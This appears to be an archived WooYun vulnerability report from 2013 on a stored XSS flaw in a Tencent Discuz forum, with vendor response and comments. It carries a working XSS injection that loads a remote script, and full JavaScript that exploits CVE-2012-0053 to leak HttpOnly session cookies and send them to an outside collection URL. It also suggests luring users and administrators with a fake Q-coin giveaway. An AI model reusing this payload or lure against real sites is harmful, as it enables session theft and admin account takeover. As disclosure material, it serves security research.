{"id": 12958, "wybug_id": "wooyun-2013-020583", "wybug_title": "腾讯某论坛XSS攻击，获取httponly", "wybug_corp": "腾讯", "wybug_author": "酱油甲", "wybug_date": "2013-03-24 18:33", "wybug_open_date": "2013-05-08 18:34", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "持久型", "安全策略失效"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-04-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-08：\t细节向公众公开  简要描述： 貌似DZ那边经常忽略啊，就来这边提交吧，反正也是腾讯的论坛腾讯某DZ论坛XSS攻击，获取httponly 详细说明：  http://bbs.open.qq.com/是APACHE服务器，由于存在CVE-2012-0053，再加上一个小小的跨站，即可获取HTTPONLY的COOKIE测试环境：win7+火狐浏览器19简单说下1.这个论坛是APACHE服务器上的，存在CVE-2012-0053，这东西能突破HTTPONLY，你们肯定知道于是我们来到任何地方，发个图片，然后在介绍里面写入：\n<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://t.cn/z12345G';>\nDZ限制了长度，利用短域名，再加上上面这串代码刚好可以嵌入\n\n\n\n这个位置需要点击才能触发跨站（这个洞洞记得有人提交过了，忘记您名字了……不好意思……不过不是本文重点，不做讨论），如何让别人点图片呢？ 图片写个：点击送Q币   ？  怎么样？\n\n2.DZ X2.5的AUTH是HTTPONLY的，所以DZ经常无视XSS漏洞吧？但是由于APACHE的漏洞，我们就能突破这个HTTPONLY\n\n例如下面这个JS（写的不好请见谅……）\nmakeRequest();    function setCookies (good) {        var str = \"\";        for (var i=0; i< 819; i++) {            str += \"x\";        }        for (i = 0; i < 10; i++) {            if (good) {                var cookie = \"xss\"+i+\"=;expires=\"+new Date(+new Date()-1).                  toUTCString()+\"; path=/;\";            }            else {                var cookie = \"xss\"+i+\"=\"+str+\";path=/\";            }            document.cookie = cookie;        }    }    function makeRequest() {        setCookies();        function parseCookies () {            var cookie_dict = {};            if (xhr.readyState === 4 && xhr.status === 400) {                var content = xhr.responseText.replace(/\\r|\\n/g,'').match                   (/<pre>(.+)<\\/pre>/);                if (content.length) {                    content = content[1].replace(\"Cookie: \", \"\");                    var cookies = content.replace(/xss\\d=x+;?/g, '').split(/;/g);                                       for (var i=0; i<cookies.length; i++) {                        var s_c = cookies[i].split('=',2);                        cookie_dict[s_c[0]] = s_c[1];                    }                }                setCookies(true);                var x=new Image();                try                {                    var myopener='';                    myopener=window.opener && window.opener.location?window.opener.location:'';                }                catch(err)                {                }                x.src='http://www.xxxx.com/save.php?cookie='+encodeURIComponent(JSON.stringify(cookie_dict));            }        }        var xhr = new XMLHttpRequest();        xhr.onreadystatechange = parseCookies;        xhr.open(\"GET\", \"httponly.php\", true);        xhr.send(null);    }\n3.然后我们来看下获取的信息，可爱的auth被爆出来了不是么~~\n\n4.更大的用途，怎么诱惑管理员来点呢？这个自由发挥吧，我只在自己的内网测了下，确实是可以通过这个COOKIE登陆后台的但是需要管理员先登陆过后台并且还要改下请求头才行~~   漏洞证明：  \n\n   修复方案：  你们比我懂   版权声明：转载请注明来源 酱油甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2013-03-25 17:41 厂商回复： 感谢反馈，已在处理中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-24 18:46 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:41        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  哇塞！    \n     2013-03-24 19:11 |    \t\tdtc \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 业余技术爱好者，来乌云学习。)\t\t \n  刘明    \n     2013-03-24 23:33 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  给力哦！HTTPONLY！！！！教程啊    \n     2013-03-29 14:13 |    \t\tDrizzle.Risk \t\t\t( 普通白帽子  |\t\t\t        Rank:255 漏洞数:19        | You have an error in your SQL syntax; ch...)\t\t \n  CVE-2012-0053 ?    \n     2014-04-26 14:50 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  洞主问下QWQ接收XSS的是啥...？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}